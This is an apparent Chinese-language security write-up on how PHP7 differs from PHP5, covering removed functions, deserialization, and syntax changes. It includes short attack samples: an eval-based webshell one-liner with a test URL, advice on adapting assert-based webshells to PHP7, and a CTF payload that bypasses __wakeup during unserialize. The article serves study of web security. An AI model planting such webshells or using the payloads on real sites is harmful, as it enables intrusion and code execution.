# PHP7 和 PHP5 在安全上的区别

## 函数修改

### preg_replace()不再支持/e修饰符


  ```php
<?php
preg_replace("/.*/e",$_GET["h"],"."); 
?>
  ```

### 新的函数preg_replace_callback

```php
<?php
preg_replace_callback("/.*/",function ($a){@eval($a[0]);},$_GET["h"]);
?>
//http://192.168.99.100:32775/test.php?h=phpinfo();
```

### create_function()被废弃

### mysql_*系列全员移除

### unserialize()增加一个可选白名单参数

```PHP
$data = unserialize($serializedObj1 , ["allowed_classes" => true]);
$data2 = unserialize($serializedObj2 , ["allowed_classes" => ["MyClass1", "MyClass2"]]);
```

其实就是一个白名单，如果反序列数据里面的类名不在这个白名单内，就会报错。

### **assert()**默认不在可以执行代码

这就是众多马不能用的罪魁祸首了，太多的马用assert()来执行代码了，这个更新基本就团灭，一般情况下修改成eval即可正常运行了~

提一下，菜刀在实现文件管理器的时候用的恰好也是assert函数，这导致菜刀没办法在PHP7上正常运行。

## 语法修改

### foreach不再改变

php7之前

### ![](http://ww1.sinaimg.cn/large/006pWR9agy1g58lyd4jvyj30ap07rglv.jpg)

![](http://ww1.sinaimg.cn/large/006pWR9agy1g58lwktshnj30ka02074b.jpg)

php7

![](http://ww1.sinaimg.cn/large/006pWR9agy1g58lzusjr2j30kw020mx7.jpg)

因为数组最后一个元素的 $value 引用在 foreach 循环之后仍会保留，在第二个循环的时候实际上是对之前的指针不断的赋值。php7中通过值遍历时，操作的值为数组的副本，不在对后续操作进行影响

### 8进制字符容错率降低

在php5版本，如果一个八进制字符如果含有无效数字，该无效数字将被静默删节。

```php
<?php
echo octdec( '012999999999999' ) .'\n';
echo octdec( '012' ) . '\n';
if (octdec( '012999999999999' )==octdec( '012' )){
        echo "octdec(octdec( '012999999999999' ))==octdec('012')";
}
?>
```

![](http://ww1.sinaimg.cn/large/006pWR9agy1g58m6yec3gj30fe00yglm.jpg)

但是在php7里面会触发一个解析错误。

这个问题同样在PHP7.0.0以后的版本又被改回去了，只影响这一个版本。

### 十六进制字符串不再被认为是数字

### 移除了 ASP 和 script PHP 标签

![](http://ww1.sinaimg.cn/large/006pWR9aly1g58m9xr2ldj30j604q0so.jpg)

现在只有`<?php ?>`这样的标签能在php7上运行了。

### `__wakeup` 函数被废弃

PHP 有个 [Bug](https://bugs.php.net/bug.php?id=72663)，触发该漏洞的PHP版本为PHP5小于5.6.25或PHP7小于7.0.10，该漏洞可以简要的概括为：当序列化字符串中表示对象个数的值`大于`真实的属性个数时会跳过 `__wakeup` 函数的执行。

``` 
<?php
class xctf
{    
	public $flag = "111";
    public function __wakeup()    
    {       
    	exit('bad requests');    
    }
} //echo serialize(new xctf());
echo unserialize($_GET['code']);echo "flag{****}";?>
```

使用这个 payload 绕过 `__wakeup` 函数

```
# O:4:"xctf":1:{s:4:"flag";s:3:"111";}
http://www.example.com/index.php?code=O:4:"xctf":2:{s:4:"flag";s:3:"111";}
```

### 超大浮点数类型转换截断

将浮点数转换为整数的时候，如果浮点数值太大，导致无法以整数表达的情况下， 在PHP5的版本中，转换会直接将整数截断，并不会引发错误。 在PHP7中，会报错。

### 杂项

`exec(), system() passthru()`函数对 NULL 增加了保护.

`list()`不再能解开字符串`string`变量

`$HTTP_RAW_POST_DATA` 被移除

`__autoload()` 方法被废弃

`parse_str()` 不加第二个参数会直接把字符串导入当前的符号表，如果加了就会转换称一个数组。现在是第二个参数是强行选项了。

统一不同平台下的整型长度

`session_start()` 可以加入一个数组覆盖php.ini的配置